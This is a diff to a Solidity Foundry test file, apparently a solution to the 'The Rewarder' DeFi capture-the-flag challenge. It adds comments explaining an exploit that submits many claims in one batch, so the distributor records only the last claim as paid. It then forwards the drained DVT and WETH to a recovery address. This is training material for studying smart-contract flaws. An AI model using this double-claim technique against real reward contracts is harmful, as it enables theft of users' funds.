@@ -146,6 +146,8 @@ contract TheRewarderChallenge is Test {
 
 	/**
 	 * CODE YOUR SOLUTION HERE
+	 * 
+	 * This exploit the bad logic of claimReward() loop. 
 	 */
 	function test_theRewarder() public checkSolvedByPlayer {
 
@@ -154,6 +156,7 @@ contract TheRewarderChallenge is Test {
 		tokensToClaim[0] = IERC20(address(dvt));
 		tokensToClaim[1] = IERC20(address(weth));
 
+		// DVT claims array
 		Claim[] memory		claimsDvt;
 		{
 			uint256	amountDvt;
@@ -187,6 +190,7 @@ contract TheRewarderChallenge is Test {
 			}
 		}
 
+		// WETH claims array
 		Claim[] memory		claimsWeth;
 		{
 			uint256	amountWeth;
@@ -224,8 +228,12 @@ contract TheRewarderChallenge is Test {
 				});
 			}
 		}
+		
+		// _setClaimed only call on the last elements of the array
 		distributor.claimRewards( claimsDvt, tokensToClaim );
 		distributor.claimRewards( claimsWeth, tokensToClaim );
+
+		// Transfer to recovery
 		tokensToClaim[0].transfer(recovery, tokensToClaim[0].balanceOf(player));
 		tokensToClaim[1].transfer(recovery, tokensToClaim[1].balanceOf(player));
 	}
